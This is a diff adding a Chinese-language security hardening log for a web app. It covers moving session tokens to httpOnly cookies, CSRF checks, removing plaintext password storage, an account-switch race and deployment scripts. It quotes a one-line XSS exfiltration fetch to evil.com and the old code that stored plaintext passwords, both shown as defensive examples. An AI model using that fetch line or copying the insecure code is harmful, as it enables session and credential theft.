@@ -444,3 +444,148 @@ docker exec siteyeb-pg psql -U p2user -d p2learning -c \
 | `docker-compose.yml` | 端口绑回环、安全环境变量透传 |
 | `src/lib/videoApi.ts` | `apiFetch` 自动带令牌、401 统一处理、错误解析 |
 | `src/stores/authStore.ts` | 监听登录失效事件 |
+
+---
+
+# 第二轮：会话改造与上线能力（2026-11-15 晚）
+
+第一轮解决了「谁能进来」，这一轮解决「进来之后凭证放在哪、能不能真的对外发布」。
+
+## 1. 令牌从 localStorage 搬进 httpOnly Cookie
+
+**为什么必须改**：localStorage 里的任何东西，页面上的 JS 都能读。
+一旦站点有 XSS（第三方库、Markdown 渲染、富文本粘贴都可能引入），
+一行 `fetch('https://evil.com?t=' + localStorage.token)` 就把会话带走了，
+而且服务端无从察觉 —— 令牌是完全合法的。
+
+搬到 `HttpOnly` Cookie 后，`document.cookie` 读不到，JS 拿不到令牌，
+XSS 的收益从「接管账号」降到「在当前页面里做点事」。
+
+**验证**（浏览器实跑）：
+
+```
+PASS  document.cookie 读不到会话（httpOnly 生效）
+PASS  登录后整页重载仍保持登录态
+PASS  手动刷新后仍登录
+```
+
+Cookie 属性：`HttpOnly; Max-Age=43200; Path=/; SameSite=lax`（生产再加 `Secure`）。
+
+## 2. CSRF：Cookie 认证的对价，必须一起做
+
+Cookie 会自动随请求发送，这正好是 CSRF 成立的条件。三道防线：
+
+| 防线 | 挡住什么 |
+|---|---|
+| `SameSite=Lax` | 跨站 POST/PUT/DELETE 默认不带 Cookie |
+| `CSRFGuardMiddleware` | 带会话 Cookie 的写请求，`Origin`/`Referer` 必须同源或命中白名单 |
+| 统一 JSON 请求体 | HTML 表单发不出 `application/json`；跨站的 JSON 请求会触发预检，过不去 |
+
+实测：
+
+```
+带 Cookie + Origin: http://evil.example.com  -> 403  csrf_rejected
+带 Cookie + Origin: http://localhost         -> 200
+带 Cookie + 无 Origin（curl/CLI）            -> 200
+```
+
+**为什么放行「无 Origin」**：curl 和内部调用不会自动带 Cookie。
+真要伪造，得先拿到 Cookie —— 那已经不是 CSRF 的威胁模型了。
+
+## 3. 登录页把明文密码存在 localStorage
+
+**证据**：`AuthPage.tsx` 原第 6-20 行
+
+```js
+const REMEMBER_KEY = 'p2m-remember';
+localStorage.setItem(REMEMBER_KEY, JSON.stringify({ username, password }));
+```
+
+「记住密码」的实现是把口令原文写进浏览器存储。共享电脑、任何 XSS、甚至
+别人翻一下 DevTools 都能直接看到。
+
+**修复**：只记住用户名，密码交给浏览器自带的凭据管理器
+（`autoComplete="username"` / `current-password`）—— 它加密存储、绑定系统钥匙串，
+比自建方案安全得多。
+
+## 4. 「修改密码」是假的
+
+**证据**：`SettingsPage.tsx` 原 `handleChangePassword`
+
+```js
+const newHash = await hashPassword(pwNew);
+await upsertUser(currentUser!, newHash);   // 只改了浏览器 IndexedDB
+```
+
+改的是本地 IndexedDB 里的哈希，**后端完全不知道**。用户会以为改了密码，
+下次登录还是旧密码；更糟的是前端提示「密码已修改」，属于静默失效。
+
+**修复**：改调 `POST /api/auth/change-password`，成功后服务端 `token_version + 1`
+并清 Cookie，前端提示后自动回登录页。
+
+## 5. 切换账号的写入竞态
+
+**问题**：前端存储写盘有 3 秒 debounce。A 账号改完数据、3 秒内切到 B 账号，
+定时器触发时用的却是 B 的会话 —— **A 的笔记会被写进 B 的账户**。
+
+**修复**（三件一起）：
+
+1. `flushAllPending()` 改为可 `await`，登出时**先落盘再清会话**（顺序反了数据就丢）
+2. IndexedDB 的 key 加用户前缀 `u{id}:{key}`。后端本来就按 `user_id` 隔离，
+   但 IndexedDB 是「后端不可用时的兜底」，不分区就会把上一个人的数据当自己的读
+3. 登录/登出后**整页重载**。9 个 store 的内存状态都是上一个账号的，
+   只换 authStore 的字段会留下一大堆脏数据
+
+第 3 点看起来笨，但它是最可靠的隔离手段 —— 不用逐个 store 写清理逻辑，
+也就不存在「漏了一个 store」的风险。
+
+## 6. 管理账号的图形界面
+
+原来只能 `curl` 建号，不像能交付的产品。新增「设置 → 用户管理」：
+
+- 新建账号、改角色、停用/启用、重置密码、删除
+- 后端强制三条防呆：不能停用/降级/删除自己；始终保留至少一个启用的管理员；
+  停用或重置密码会让该用户**所有已登录设备立即掉线**（`token_version + 1`）
+- 页面只在 `role === 'admin'` 时露出入口，但**权限判断始终在服务端** ——
+  前端隐藏只是体验，不是安全边界
+
+实测：member 调 `GET /api/admin/users` → 403；管理员界面建号成功。
+
+## 7. 上线能力
+
+| 文件 | 作用 |
+|---|---|
+| `docker-compose.https.yml` + `Caddyfile` | 自动申请/续期证书，TLS 终止，HSTS |
+| `scripts/backup.sh` | `pg_dump -Fc` + 保留期清理 + 文件头校验 |
+| `scripts/restore.sh` | 恢复前自动建回滚点，需输入 `yes` 确认 |
+| `scripts/preflight.sh` | 16 项上线自检，输出 PASS/WARN/FAIL |
+
+自检实跑抓到的问题：**`JWT_SECRET` 仍是示例值**。
+这意味着任何人都能用公开的默认密钥伪造管理员令牌 —— 第一轮加了鉴权，
+但密钥没换，等于给门上装了锁却把钥匙挂在门把手上。已换成 64 字符随机串，
+代价是所有旧令牌失效、需要重新登录一次。
+
+## 8. 第一轮遗留项的更新
+
+| 项 | 状态 |
+|---|---|
+| 令牌存 localStorage | ✅ **已修**，改 httpOnly Cookie |
+| 笔记/番茄钟不按账号隔离 | ✅ **已修**，IndexedDB/存储按 `user_id` 分区 + 切号重载 |
+| 无 HTTPS | ✅ **已提供方案**，Caddy 一键；实际证书需要域名 |
+| 无备份策略 | ✅ **已修**，脚本 + cron 示例；实际定时任务需部署时配置 |
+| 无 refresh token | ⬜ 仍未做。12 小时过期 + 改密码即撤销，够用 |
+| 视频文件公开可访问 | ⬜ 仍是共享资源（产品选择，非疏漏），要鉴权需改签名 URL |
+| 单进程 ThreadPoolExecutor | ⬜ 单机部署无影响；多副本需要分布式锁 |
+
+## 9. 现在离「多租户 SaaS」还差什么
+
+说清楚这件事比声称「什么都能干」更有价值：
+
+- **没有组织/团队概念**：`user_id` 是唯一隔离维度，加不了「一个团队共享一份视频库」
+- **视频库全局共享**：所有用户看到同一批视频。做 SaaS 需要 `tenant_id` 贯穿所有表
+- **没有审计日志**：谁在什么时候改了谁的权限，现在查不到
+- **没有配额与计费**：LLM 调用没有按用户计量，一个人可以把额度跑光
+- **没有数据导出/注销流程**：合规上不完整
+
+这些不是「补个功能」，是数据模型层面的重构。**面试时主动讲这一条，比被问出来好。**
+
